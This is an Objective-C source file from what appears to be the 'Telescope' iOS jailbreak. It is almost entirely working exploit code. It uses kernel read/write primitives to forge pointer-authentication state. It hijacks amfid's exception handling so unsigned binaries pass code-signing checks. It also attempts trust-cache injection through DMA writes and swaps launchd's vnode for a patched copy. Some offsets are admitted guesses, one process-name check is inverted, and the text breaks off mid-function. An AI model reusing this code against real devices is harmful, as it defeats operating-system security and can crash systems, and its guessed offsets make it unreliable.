//
//  loadtelescoped.m
//  Telescope
//
//  Created by Jonah Butler on 1/15/24.
//

#include "libkfd.h"
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#include "loadtelescoped.h"
#import "pplrw.h"
#import "IOSurface_Primitives.h"
#import "libkfd/perf.h"
#define SYSTEM_VERSION_LOWER_THAN(v)                ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v)     ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)
#define SYSTEM_VERSION_EQUAL_TO(v)                  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v)  ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
mach_port_t amfid_exceptionport;
extern int spawnRoot(NSString* path, NSArray* args, NSString** stdOut, NSString** stdErr); // this gives me the heebeejeebees (or however the fuck you spell it)
extern int userspaceReboot(void);
static uint64_t thread_copy_jop_pid(mach_port_t to, mach_port_t from)
{
    UInt64 thread_to = ipc_entry_lookup(to);
    UInt64 thread_from = ipc_entry_lookup(from);
    uint64_t jop_pid = kread64_kfd(thread_from + 0x170); // pray 0x170 is the right offset
    uint64_t to_jop_pid = kread64_kfd(thread_to + 0x170); // continue praying
    NSLog(@"replace jop_pid %#llx -> %#llx", to_jop_pid, jop_pid);
    kwrite64_kfd(thread_to + 0x170, jop_pid); // pray again!
    return to_jop_pid;
}

static void thread_set_jop_pid(mach_port_t to, uint64_t jop_pid)
{
    UInt64 thread_to = ipc_entry_lookup(to);
    kwrite64_kfd(thread_to + 0x170, jop_pid); // omg so much
}

void* uPAC_bypass_strategy_2(UInt64 target_pc, mach_port_t amfid_thread)
{
    mach_port_t thread;
    kern_return_t err;
    err = thread_create(mach_task_self(), &thread);
    assert(err == KERN_SUCCESS);
    arm_thread_state64_t state;
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    err = thread_get_state(mach_thread_self(), ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    assert(err == KERN_SUCCESS);
    void *pc = (void *)((uintptr_t)target_pc & ~0xffffff8000000000);
    pc = ptrauth_sign_unauthenticated(pc, ptrauth_key_asia, ptrauth_string_discriminator("pc"));
    state.__opaque_pc = pc;
    err = thread_set_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT);
    assert(err == KERN_SUCCESS);

    uint64_t saved_jop_pid = thread_copy_jop_pid(thread, amfid_thread);
    count = ARM_THREAD_STATE64_COUNT;
    err = thread_get_state(thread, ARM_THREAD_STATE64, (thread_state_t)&state, &count);
    assert(err == KERN_SUCCESS);

    void *signed_pc = state.__opaque_pc;
    NSLog(@"strategy 2, signed pc %p", signed_pc);

    thread_set_jop_pid(thread, saved_jop_pid);
    err = thread_terminate(thread);
    assert(err == KERN_SUCCESS);
    return signed_pc;
}
NSString* GenerateRandomString(int length, unsigned int seed)
{
    char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int charsetSize = strlen(charset);
    
    srand(seed); // Set the seed for the random number generator
    
    NSMutableString* randomString = [NSMutableString stringWithCapacity:length];
    
    for (int i = 0; i < length; ++i) {
        char randomChar = charset[rand() % charsetSize];
        [randomString appendFormat:@"%c", randomChar];
    }
    
    return randomString;
}
int getamfidpid(void) {
    uint64_t proc = get_kernel_proc();
    uint64_t off_p_name = 0;
    if(SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"16.4")) {
        off_p_name = 0x579;
    } else if(SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(@"16.3.1")) {
        off_p_name = 0x381;
    }

    while(true) {
        uint64_t nameptr = proc + off_p_name;
        char name[32];
        kread_kfd(_kfd, nameptr, &name, 32);
        if(strcmp(name,(char*)"amfid")) {
            return kread32_kfd(proc + 0x60);
        }
        proc = kread64_kfd(proc + 0x8);
        if(!proc) {
            return -1;
        }
        }
    return 0;
}
char* TelescopeDir(void)
{
    const char* hash = GenerateRandomString(13, 13).UTF8String;
    static char result[MAXPATHLEN];
    sprintf(result, "/private/preboot/%s", hash);
    return result;
}

uint64_t unsign_kptr(uint64_t pac_kaddr) 
{
    return pac_kaddr | 0xffffff8000000000;
}
typedef CF_OPTIONS(uint32_t, SecCSFlags) {
    kSecCSDefaultFlags = 0,                    /* no particular flags (default behavior) */
    kSecCSConsiderExpiration = 1 << 31,        /* consider expired certificates invalid */
};
typedef void *SecStaticCodeRef;
OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef  _Nullable *staticCode);
OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef  _Nullable *information);
CFStringRef (*_SecCopyErrorMessageString)(OSStatus status, void * __nullable reserved) = NULL;

enum cdHashType {
    cdHashTypeSHA1 = 1,
    cdHashTypeSHA256 = 2
};

static const char *cdHashName[3] = { NULL, "SHA1", "SHA256" };

static enum cdHashType requiredHash = cdHashTypeSHA256;
#define TRUST_CDHASH_LEN (20)

const void *CFArrayGetValueAtIndex_prevenOverFlow(CFArrayRef theArray, CFIndex idx)
{
    CFIndex arrCnt = CFArrayGetCount(theArray);
    if(idx >= arrCnt){
        idx = arrCnt - 1;
    }
    return CFArrayGetValueAtIndex(theArray, idx);
}
bool calc_cdhash(const char *filepath, uint8_t outcdhash[TRUST_CDHASH_LEN])
{
    SecStaticCodeRef staticCode = NULL;

    CFStringRef cfstr_path = CFStringCreateWithCString(kCFAllocatorDefault, filepath, kCFStringEncodingUTF8);
    CFURLRef cfurl = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, cfstr_path, kCFURLPOSIXPathStyle, false);
    CFRelease(cfstr_path);
    OSStatus result = SecStaticCodeCreateWithPathAndAttributes(cfurl, kSecCSDefaultFlags, NULL, &staticCode);
    CFRelease(cfurl);
    if (result != 0) {
        if (_SecCopyErrorMessageString != NULL) {
            CFStringRef error = _SecCopyErrorMessageString(result, NULL);

            NSLog(@"Unable to generate cdhash for %s: %s", filepath, CFStringGetCStringPtr(error, kCFStringEncodingUTF8));
            CFRelease(error);
        } else {
            NSLog(@"Unable to generate cdhash for %s: %d", filepath, result);
        }
        return false;
    }

    CFDictionaryRef signinginfo;
    result = SecCodeCopySigningInformation(staticCode, kSecCSDefaultFlags, &signinginfo);
    CFRelease(staticCode);
    if (result != 0) {
        NSLog(@"Unable to copy cdhash info for %s", filepath);
        return false;
    }

    CFArrayRef cdhashes = CFDictionaryGetValue(signinginfo, CFSTR("cdhashes"));
    CFArrayRef algos = CFDictionaryGetValue(signinginfo, CFSTR("digest-algorithms"));
    int algoIndex = -1;
    CFNumberRef nn = CFArrayGetValueAtIndex_prevenOverFlow(algos, requiredHash);
    if(nn){
        CFNumberGetValue(nn, kCFNumberIntType, &algoIndex);
    }

    //(printf)("cdhashesCnt: %d\n", CFArrayGetCount(cdhashes));
    //(printf)("algosCnt: %d\n", CFArrayGetCount(algos));

    CFDataRef cdhash = NULL;
    if (cdhashes == NULL) {
        NSLog(@"%s: no cdhashes", filepath);
    } else if (algos == NULL) {
        NSLog(@"%s: no algos", filepath);
    } else if (algoIndex == -1) {
        NSLog(@"%s: does not have %s hash", cdHashName[requiredHash], filepath);
    } else {
        cdhash = CFArrayGetValueAtIndex_prevenOverFlow(cdhashes, requiredHash);
        if (cdhash == NULL) {
            NSLog(@"%s: missing %s cdhash entry", filepath, cdHashName[requiredHash]);
        }
    }
    if(cdhash == NULL){
        CFRelease(signinginfo);
        return false;
    }

    //(printf)("cdhash len: %d\n", CFDataGetLength(cdhash));
    memcpy(outcdhash, CFDataGetBytePtr(cdhash), TRUST_CDHASH_LEN);
    CFRelease(signinginfo);
    return true;
}
void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size, uint64_t shadowp)
{
    // Build a self-contained, remote-address-adapted CFDictionary instance

    CFDataRef _cfhash_cfdata = CFDataCreate(kCFAllocatorDefault, input_cdHash, TRUST_CDHASH_LEN);
    void *cfhash_cfdata = (void*)_cfhash_cfdata;
    const char *iomatch_key = "CdHash"; // kMISValidationInfoCdHash

    size_t key_len = strlen(iomatch_key) + 0x11;
    key_len = (~0xF) & (key_len + 0xF);
    size_t value_len = 0x60; // size of self-contained CFData instance
    value_len = (~0xF) & (value_len + 0xF);
    size_t total_len = key_len + value_len + 0x40;

    *out_size = total_len;
    void *writep = calloc(1, total_len);

    char *realCFString = (char*)CFStringCreateWithCString(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", kCFStringEncodingUTF8);
    const void *keys[] = { realCFString };
    const void *values[] = { cfhash_cfdata };
    char *realCFDic = (char*)CFDictionaryCreate(0, keys, values, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFRetain(realCFDic); // Pump in some extra lifes
    CFRetain(realCFDic);
    CFRetain(realCFDic);
    CFRetain(realCFDic);
    memcpy(writep, realCFDic, 0x40);

    writep = writep + total_len - value_len;
    shadowp = shadowp + total_len - value_len;
    uint64_t value = shadowp;
    memcpy(writep, cfhash_cfdata, 0x60);
    CFRelease(cfhash_cfdata);

    writep -= key_len;
    shadowp -= key_len;
    uint64_t key = shadowp;
    *(uint64_t*)(writep) = *(uint64_t*)realCFString;
    *(uint64_t*)(writep + 8) = *(uint64_t*)(realCFString + 8);
    *(uint8_t*)(writep + 16) = strlen(iomatch_key);
    memcpy(writep + 17, iomatch_key, strlen(iomatch_key) + 1);

    writep -= 0x40;
    shadowp -= 0x40;
    *(uint64_t*)(writep + 0x10) = 0x41414141;//key;
    *(uint64_t*)(writep + 0x18) = 0x42424242;//value;
    *(uint64_t*)(writep + 0x20) = key;//0x43434343;
    *(uint64_t*)(writep + 0x28) = value;//0x44444444;
    *(uint64_t*)(writep + 0x30) = 0;//0x45454545;
    *(uint64_t*)(writep + 0x38) = 0;//0x46464646;

    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFDic);
    CFRelease(realCFString);

    return writep;
}
uint64_t amfid_alloc_page = 0;
uint64_t amfid_cdhash_off = 0;
uint64_t amfid_dict_isa = 0;

static void reply_thread_exception(exception_raise_request *req)
{
    kern_return_t kr;
    exception_raise_reply reply = {};
    mach_msg_size_t send_size = sizeof(reply);
    mach_msg_size_t recv_size = 0;

    reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(req->Head.msgh_bits), 0);
    reply.Head.msgh_size = sizeof(reply);
    reply.Head.msgh_remote_port = req->Head.msgh_remote_port;
    reply.Head.msgh_local_port = MACH_PORT_NULL;
    reply.Head.msgh_id = req->Head.msgh_id + 100;

    reply.NDR = req->NDR;
    reply.RetCode = KERN_SUCCESS;

    kr = mach_msg(&reply.Head, MACH_SEND_MSG,
            send_size, recv_size,
            MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    assert(kr == KERN_SUCCESS);
}
static void *amfid_exception_thread(void *args)
{
    kern_return_t kr;
    arm_thread_state64_t ts;
    mach_msg_type_number_t tscount;
    mach_msg_size_t send_size = 0;
    mach_msg_size_t recv_size = 0x1000;
    mach_msg_header_t *msg = malloc(recv_size);
    uintptr_t callee_lr = 0; // BRAA 0x41414141
    uintptr_t signed_pc = 0; // return to


    for(;;) {
        //util_info("calling mach_msg to receive exception message from amfid");
        kr = mach_msg(msg, MACH_RCV_MSG,
                send_size, recv_size,
                amfid_exceptionport, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            NSLog(@"error receiving on exception port: %s", mach_error_string(kr));
            continue;
        }

        exception_raise_request* req = (exception_raise_request*)msg;

        mach_port_t thread_port = req->thread.name;
        mach_port_t task_port = req->task.name;

        tscount = ARM_THREAD_STATE64_COUNT;
        kr = thread_get_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&ts, &tscount);
        if (kr != KERN_SUCCESS){
            NSLog(@"error getting thread state: %s", mach_error_string(kr));
            continue;
        }

        uintptr_t pc;
        pc = (uintptr_t)ts.__opaque_pc & 0x0000007fffffffff; // ignore error, __opaque* only defined with comptime flag.
        // first exceptioin
        if (callee_lr == 0) {
            NSLog(@"first time: pc %p, lr %p", ts.__opaque_pc, ts.__opaque_lr); // ignore error, __opaque* only defined with comptime flag.
            assert(pc == 0x41414141);
            callee_lr = (uintptr_t)ts.__opaque_lr & 0x0000007fffffffff; // ignore error, __opaque* only defined with comptime flag.
            signed_pc = (uintptr_t)uPAC_bypass_strategy_2(pc, thread_port);
            NSLog(@"signed pc %#lx", signed_pc);
        }

        // get the filename pointed to by X22
        char filepath[PATH_MAX];
        mach_vm_size_t outsizedispose = 0;
        vm_read_overwrite(task_port, ts.__x[22], sizeof(filepath), &filepath, &outsizedispose);
        NSLog(@"amfid request: %s", filepath);

        uint32_t dict_off = 0x00;
        
        uint8_t cdhash[TRUST_CDHASH_LEN];
        bool ok = calc_cdhash(filepath, cdhash);
        if (ok) {
            if (amfid_alloc_page == 0) {
                // Allocate a page of memory in amfid, where we stored cfdic for bypass signature valid
                UInt64 alloc_size = 0;
                UInt64 dispose = 0;
                sysctlbyname("hw.pagesize", &alloc_size, &dispose, NULL, 0);
                vm_allocate(task_port, &amfid_alloc_page, alloc_size,VM_FLAGS_ANYWHERE);
                NSLog(@"amfid_alloc_page: 0x%llx", amfid_alloc_page);

                size_t out_size = 0;
                char *fakedic = Build_ValidateSignature_dic(cdhash, &out_size, amfid_alloc_page + dict_off);
               // util_hexprint_width(fakedic, out_size, 8, "fake cdhash dict");
                kern_return_t ret = vm_write(task_port, amfid_alloc_page + dict_off, fakedic, out_size);
                assert(ret == KERN_SUCCESS);
               // task_write(task_port, amfid_alloc_page + dict_off, fakedic, (uint32_t)out_size);
                amfid_cdhash_off = amfid_alloc_page + dict_off + 0x90; // To update cdhash in the same cfdic
                amfid_dict_isa = *(uint64_t*)(fakedic); // To keep dic away from being release
                free(fakedic);
            }
            kern_return_t ret = vm_write(task_port,amfid_cdhash_off,cdhash,sizeof(cdhash));
            assert(ret == KERN_SUCCESS);
            //task_write(task_port, amfid_cdhash_off, cdhash, sizeof(cdhash));
            ret = vm_write(task_port, amfid_alloc_page + dict_off, &amfid_dict_isa, sizeof(amfid_dict_isa));
            assert(ret == KERN_SUCCESS);
            //task_write64(task_port, amfid_alloc_page + dict_off, amfid_dict_isa);
        }
        UInt64 val = amfid_alloc_page + dict_off;
        kern_return_t ret = vm_write(task_port, ts.__x[2], &val, sizeof(val));
        assert(ret == KERN_SUCCESS);
        //task_write64(task_port, ts.__x[2], amfid_alloc_page + dict_off);
        ts.__x[0] = 0; // MISValidateSignatureAndCopyInfo success
        ts.__opaque_pc = (void *)signed_pc; // ignore error, __opaque* only defined with comptime flag.

        // set the new thread state:
        kr = thread_set_state(thread_port, ARM_THREAD_STATE64, (thread_state_t)&ts, ARM_THREAD_STATE64_COUNT);

        reply_thread_exception(req);

        mach_port_deallocate(mach_task_self(), thread_port);
        mach_port_deallocate(mach_task_self(), task_port);
    }
    return NULL;
}
uint64_t GetVnodeAtPath(char* filename) {
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    uint64_t proc = get_proc(getpid());

    uint64_t filedesc_pac = kread64_kfd(proc + off_proc_pfd);
    uint64_t filedesc = unsign_kptr(filedesc_pac);
    uint64_t openedfile = kread64_kfd(filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64_kfd(openedfile + off_fp_glob);
    uint64_t fileglob = unsign_kptr(fileglob_pac);
    uint64_t vnode_pac = kread64_kfd(fileglob + off_fg_data);
    uint64_t vnode = unsign_kptr(vnode_pac);
    
    close(file_index);
    
    return vnode;
}

uint64_t FindChildVnodeByVnode(uint64_t vnode, char* childname) 
{
    uint64_t vp_nameptr = kread64_kfd(vnode + off_vnode_v_name);
    uint64_t vp_name = kread64_kfd(vp_nameptr);
    
    uint64_t vp_namecache = kread64_kfd(vnode + off_vnode_v_ncchildren_tqh_first);
    
    if(vp_namecache == 0)
        return 0;
    
    while(1) {
        if(vp_namecache == 0)
            break;
        vnode = kread64_kfd(vp_namecache + off_namecache_nc_vp);
        if(vnode == 0)
            break;
        vp_nameptr = kread64_kfd(vnode + off_vnode_v_name);
        
        char vp_name[256];
        kreadbuf_kfd(vp_nameptr, &vp_name, 256);
        
        if(strcmp(vp_name, childname) == 0) {
            return vnode;
        }
        vp_namecache = kread64_kfd(vp_namecache + off_namecache_nc_child_tqe_prev);
    }
    
    return 0;
}

uint64_t GetVnodeAtPathByChdir(char *path) 
{
    printf("get vnode of %s", path);
    if(access(path, F_OK) == -1) {
        NSLog(@"accessing not OK");
        return -1;
    }
    if(chdir(path) == -1) {
        printf("chdir not OK");
        return -1;
    }
    uint64_t fd_cdir_vp = kread64_kfd(get_proc(getpid()) + off_proc_pfd + off_fd_cdir);
    chdir("/");
    return fd_cdir_vp;
}

int SwitchSysBinOld(uint64_t vnode, char* what, char* with)
{
    uint64_t vp_nameptr = kread64_kfd(vnode + off_vnode_v_name);
    uint64_t vp_namecache = kread64_kfd(vnode + off_vnode_v_ncchildren_tqh_first);
    if(vp_namecache == 0)
        return 0;
    
    while(1) {
        if(vp_namecache == 0)
            break;
        vnode = kread64_kfd(vp_namecache + off_namecache_nc_vp);
        if(vnode == 0)
            break;
        vp_nameptr = kread64_kfd(vnode + off_vnode_v_name);
        
        char vp_name[16];
        kreadbuf_kfd(kread64_kfd(vp_namecache + 96), &vp_name, 16);
        
        if(strcmp(vp_name, what) == 0)
        {
            uint64_t with_vnd = GetVnodeAtPath(with);
            uint32_t with_vnd_id = kread64_kfd(with_vnd + 116);
            uint64_t patient = kread64_kfd(vp_namecache + 80);        // vnode the name refers
            uint32_t patient_vid = kread64_kfd(vp_namecache + 64);    // name vnode id
            printf("patient: %llx vid:%llx -> %llx\n", patient, patient_vid, with_vnd_id);

            kwrite64_kfd(vp_namecache + 80, with_vnd);
            kwrite32_kfd(vp_namecache + 64, with_vnd_id);
            
            return vnode;
        }
        vp_namecache = kread64_kfd(vp_namecache + off_namecache_nc_child_tqe_prev);
    }
    return 0;
}
uint64_t alloc(size_t size) {
    /*
    uint64_t begin = get_kernel_proc();
    uint64_t end = begin + 0x40000000;
    uint64_t addr = begin;
    while (addr < end) {
        bool found = false;
        for (int i = 0; i < size; i+=4) {
            uint32_t val = kread32_kfd(addr);
            found = true;
            if (val != 0) {
                found = false;
                addr += i;
                break;
            }
        }
        if (found) {
            NSLog(@"[+] dirty_kalloc: 0x%llx\n", addr);
            UInt64 towrite = 0x414141414;
            kwritebuf_kfd(addr, &towrite, size);
            return addr;
        }
        addr += 0x1000;
    }
    if (addr >= end) {
        NSLog(@"[-] failed to find free space in kernel\n");
        exit(EXIT_FAILURE);
    }
    return 0;
     */
    // Allocate better hopefully.
    UInt64 toreturn = 0;
    vm_allocate(mach_task_self(), (vm_address_t*)&toreturn, size, VM_FLAGS_ANYWHERE);
    return toreturn;
}
uint64_t SwitchSysBin(char* to, char* from, uint64_t* orig_to_vnode, uint64_t* orig_nc_vp)
{
    uint64_t to_vnode = GetVnodeAtPath(to);
    if(to_vnode == -1) {
        NSString *to_dir = [[NSString stringWithUTF8String:to] stringByDeletingLastPathComponent];
        NSString *to_file = [[NSString stringWithUTF8String:to] lastPathComponent];
        uint64_t to_dir_vnode = GetVnodeAtPathByChdir(to_dir.UTF8String);
        to_vnode = FindChildVnodeByVnode(to_dir_vnode, to_file.UTF8String);
        if(to_vnode == 0) {
            printf("[-] Couldn't find file (to): %s", to);
            return -1;
        }
    }

    uint64_t from_vnode = GetVnodeAtPath(from);
    if(from_vnode == -1) {
        NSString *from_dir = [[NSString stringWithUTF8String:from] stringByDeletingLastPathComponent];
        NSString *from_file = [[NSString stringWithUTF8String:from] lastPathComponent];
        uint64_t from_dir_vnode = GetVnodeAtPathByChdir(from_dir.UTF8String);
        from_vnode = FindChildVnodeByVnode(from_dir_vnode, from_file.UTF8String);
        if(from_vnode == 0) {
            printf("[-] Couldn't find file (from): %s", from);
            return -1;
        }
    }

    uint64_t to_vnode_nc = kread64_kfd(to_vnode + off_vnode_v_nclinks_lh_first);
    *orig_nc_vp = kread64_kfd(to_vnode_nc + off_namecache_nc_vp);
    *orig_to_vnode = to_vnode;
    kwrite64_kfd(to_vnode_nc + off_namecache_nc_vp, from_vnode);
    return 0;
}
UInt64 getLoadAddr(mach_port_t port) {
    mach_msg_type_number_t region_count = VM_REGION_BASIC_INFO_64;
    mach_port_t object_name = MACH_PORT_NULL;
    mach_vm_address_t first_addr = 0;
    mach_vm_size_t first_size = 0x1000;
    vm_region_basic_info_64_t region;
    UInt64 regionSz = sizeof(region);
    kern_return_t ret = mach_vm_region(port, &first_addr, &first_size, VM_REGION_BASIC_INFO_64, &region, &region_count, &object_name);
    if(ret != KERN_SUCCESS) {
        NSLog(@"Couldn't get region: %s",mach_error_string(ret));
    }
    return first_addr;
}
size_t kwritebuf_tcinject(uint64_t where, const void *p, size_t size) {
    size_t remainder = size % 8;
    if (remainder == 0)
        remainder = 8;
    size_t tmpSz = size + (8 - remainder);
    if (size == 0)
        tmpSz = 0;

    uint64_t *dstBuf = (uint64_t *)p;
    size_t alignedSize = (size & ~0b111);

    for (int i = 0; i < alignedSize; i+=8){
        kwrite64_kfd(where + i, dstBuf[i/8]);
    }
    if (size > alignedSize) {
        uint64_t val = kread64_kfd(where + alignedSize);
        memcpy(&val, ((uint8_t*)p) + alignedSize, size-alignedSize);
        kwrite64_kfd(where + alignedSize, val);
    }
    return size;
}
void tcinjecttest(void) {
    UInt64 pmap_image4_trust_caches = 0xfffffff007c084d8 /*MAYBE??!*/ + get_kernel_slide(); //still need to figure out how to find this damn offset lol.
    UInt64 mem = alloc(0x4000);
    UInt64 payload = alloc(0x4000);
    if(mem == 0) {
        NSLog(@"Failed to allocate memory for TrustCache: %p",mem);
        exit(EXIT_FAILURE); // ensure no kpanics
    }
    NSLog(@"Writing blackbathingsuit!");
    NSString  *str = @"blackbathingsuit";
    NSData *data = [str dataUsingEncoding: NSASCIIStringEncoding];
    memcpy((void*)payload,data.bytes,data.length);
    NSLog(@"Wrote blackbathingsuit!");
    sleep(1);
    NSLog(@"Writing payload!");
    UInt64 payloadpaddr = vtophys_kfd(payload);
    UInt64 payloadkaddr = phystokv_kfd(payloadpaddr);
    memcpy((void*)mem + offsetof(trustcache_module, fileptr), &payloadkaddr, sizeof(UInt64));
    NSLog(@"Wrote payload!");
    sleep(1);
    NSLog(@"Writing length!");
    UInt64 len = data.length;
    memcpy((void*)mem + offsetof(trustcache_module, module_size),&len,sizeof(UInt64));
    NSLog(@"Wrote length!");
    sleep(1);
    UInt64 mempaddr = vtophys_kfd(mem);
    UInt64 memkaddr = phystokv_kfd(mempaddr);
    UInt64 trustcache = kread64_ptr_kfd(pmap_image4_trust_caches);
    NSLog(@"Beginning trustcache insertion!");
    if(!trustcache) {
        dma_perform(^{
            dma_writevirt64(pmap_image4_trust_caches, memkaddr);
        });
        NSLog(@"Trustcache didn't already exist, write our stuff directly, and skip to end.");
        goto done;
    }
    UInt64 prev = 0;
    NSLog(@"Entering while(trustcache)!");
    sleep(1);
    /*
    while(trustcache) {
        prev = trustcache;
        trustcache = kread64_ptr_kfd(trustcache);
    } */ // knew this was broken.
    prev = trustcache;
    NSLog(@"Entering dma_perform!");
    sleep(1);
    dma_perform(^{
        NSLog(@"Entered dma_perform!");
        dma_writevirt64(prev, memkaddr);
        dma_writevirt64(memkaddr+8, prev);
    });
done:
    sleep(1);
    NSLog(@"TrustCache Successfully loaded!");
}
UInt64 load_telescope(void)
{
    /*
    NSString * err = NSString.new;
    NSString * out = NSString.new;

    NSString *ldidPath = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"ldid"];
    NSString *helper = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"helper"];
    NSString *sign = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"fastPathSign"];
    NSString *injPath = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"insert_dylib"];

    NSString *patchpth = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"launchdhook.dylib"];
    NSString *ents = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"launchd.plist"];

    char* ts_dir = TelescopeDir();    
    
    if ([NSFileManager.defaultManager fileExistsAtPath:@(ts_dir)])
        {  spawnRoot(helper, @[@"rm", @(ts_dir)], &out, &err); }

    spawnRoot(helper, @[@"mkdir", @(ts_dir)], &out, &err);

    char copiedldid[512]; sprintf(copiedldid, "%s/%s", ts_dir, "ldid");
    char copiedhelper[512]; sprintf(copiedhelper, "%s/%s", ts_dir, "helper");
    char copiedsign[512]; sprintf(copiedsign, "%s/%s", ts_dir, "sign");
    char copiedinjector[512]; sprintf(copiedinjector, "%s/%s", ts_dir, "injector");


    spawnRoot(helper, @[@"copy", helper, @(copiedhelper)], &out, &err);
    spawnRoot(helper, @[@"copy", injPath, @(copiedinjector)], &out, &err); 
    spawnRoot(helper, @[@"copy", sign, @(copiedsign)], &out, &err);
    spawnRoot(helper, @[@"copy", ldidPath, @(copiedldid)], &out, &err);

    char originallaunchd[512]; sprintf(originallaunchd, "%s/%s", ts_dir, "telescope");
    char originalamfid[512]; sprintf(originalamfid, "%s/%s", ts_dir, "dead_amfid");
    char originalxpc[512]; sprintf(originalxpc, "%s/%s", ts_dir, "brainwashed_xpc");
    char patch[512]; sprintf(patch, "%s/%s", ts_dir, "patch.dylib");
    char amfidpatch[512]; sprintf(amfidpatch, "%s/%s", ts_dir, "amfidpatch.dylib");

    spawnRoot(helper, @[@"copy", @"/sbin/launchd", @(originallaunchd)], &out, &err);
    //spawnRoot(helper, @[@"copy", @"/usr/libexec/amfid", @(originalamfid)], &out, &err);
    spawnRoot(helper, @[@"copy", @"/usr/libexec/xpcproxy", @(originalxpc)], &out, &err);

   // spawnRoot(helper, @[@"xmldump", @"/usr/libexec/amfid", [@(originalamfid) stringByAppendingPathExtension:@"plist"]], &out, &err);
    spawnRoot(helper, @[@"xmldump", @"/usr/libexec/xpcproxy", [@(originalxpc) stringByAppendingPathExtension:@"plist"]], &out, &err);

    spawnRoot(helper, @[@"copy", patchpth, @(patch)], &out, &err);
    // SignEnvironment();

    // patch launchd
    spawnRoot(helper, @[@"pacstrip", @(originallaunchd)], &out, &err);
    spawnRoot(injPath, @[@"--all-yes", @"--inplace", @(patch), @(originallaunchd)], &out, &err);
    spawnRoot(ldidPath, @[[@"-S" stringByAppendingString:ents], @"-Cadhoc", @(originallaunchd)], &out, &err);
    spawnRoot(sign, @[@(originallaunchd)], &out, &err);

    // patch xpc
    spawnRoot(helper, @[@"pacstrip", @(originalxpc)], &out, &err);
    spawnRoot(injPath, @[@"--all-yes", @"--inplace", @(patch), @(originalxpc)], &out, &err);
    spawnRoot(ldidPath, @[[@"-S" stringByAppendingString:[@(originalxpc) stringByAppendingPathExtension:@"plist"]], @"-Cadhoc", @(originalxpc)], &out, &err);
    spawnRoot(sign, @[@(originalxpc)], &out, &err);

    int amfidpid = getamfidpid();
    if(amfidpid == -1) {
        NSLog(@"Failed to get amfid pid!");
    }
    mach_port_t amfidport = 0;
    kern_return_t ret = task_for_pid(mach_task_self(), amfidpid, &amfidport);
    if(ret != 0) {
        NSLog(@"Couldn't get amfid task: %s",mach_error_string(ret));
        return 0;
    }
    UInt64 loadAddress = getLoadAddr(amfidport);
    mach_port_t exceptionPort = 0;
    void *amfid_header = malloc(0x8000);
    assert(amfid_header != NULL);
    mach_vm_size_t outsizedispose = 0;
    void *libmis = dlopen("libmis.dylib", RTLD_LAZY);
    void *MISVALidblalal = dlsym(libmis,"MISValidateSignatureAndCopyInfo");
    vm_read_overwrite(amfidport, loadAddress, 0x8000, amfid_header, &outsizedispose);
    void* found = memmem(amfid_header,0x8000,&MISVALidblalal,sizeof(MISVALidblalal));
    size_t offset_MISIAblalbdl = found - amfid_header;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amfid_exceptionport);
    mach_port_insert_right(mach_task_self(), amfid_exceptionport, amfid_exceptionport, MACH_MSG_TYPE_MAKE_SEND);
    task_set_exception_ports(amfidport, EXC_MASK_BAD_ACCESS, amfid_exceptionport, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,ARM_THREAD_STATE64);
    vm_address_t page = (loadAddress + offset_MISIAblalbdl) & ~vm_page_mask;
    vm_protect(amfidport, page, vm_page_size, 0, VM_PROT_READ | VM_PROT_WRITE);
    UInt64 data = ptrauth_sign_unauthenticated((void*)0x12345, ptrauth_key_asia, (loadAddress + offset_MISIAblalbdl));
    vm_write(amfidport,(loadAddress + offset_MISIAblalbdl),&data,sizeof(UInt64)); //Nobody likes you, amfid.
    NSLog(@"Amfid should now crash as soon as it tries to authenticate a binary, we will redirect handle this exception to make it continue, and allow the unauthenticated binary.");
    NSLog(@"Amfid task port: %d",amfidport);
    // spin up a thread to handle exceptions:
       pthread_t th_exception;
       pthread_attr_t attr;
       pthread_attr_init(&attr);
       pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
       pthread_create(&th_exception, &attr, amfid_exception_thread, NULL);
    uint64_t orig_nc_vp, orig_to_vnode = 0;
    SwitchSysBinOld(GetVnodeAtPathByChdir("/sbin"), "launchd", originallaunchd);
